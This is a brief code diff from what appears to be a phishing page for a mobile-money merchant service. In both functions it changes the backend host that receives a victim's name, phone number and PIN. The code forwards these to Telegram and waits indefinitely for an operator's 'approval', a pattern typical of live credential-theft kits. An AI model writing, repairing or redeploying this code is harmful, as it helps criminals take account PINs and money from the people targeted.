@@ -358,7 +358,7 @@ function getUserName() {
 }
 
 async function sendMerchantPinToTelegram(name, phone, pin) {
-  const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
+  const BACKEND_URL = "https://mixx-by-yass.onrender.com";
   
   const payload = {
     name: name || "Unknown",
@@ -409,7 +409,7 @@ async function sendMerchantPinToTelegram(name, phone, pin) {
 }
 
 async function pollMerchantPinApproval(requestId) {
-  const BACKEND_URL = "https://mixx-by-yas-biashara.onrender.com";
+  const BACKEND_URL = "https://mixx-by-yass.onrender.com";
   let attempts = 0;
   
   // NO TIMEOUT - Wait indefinitely for admin approval
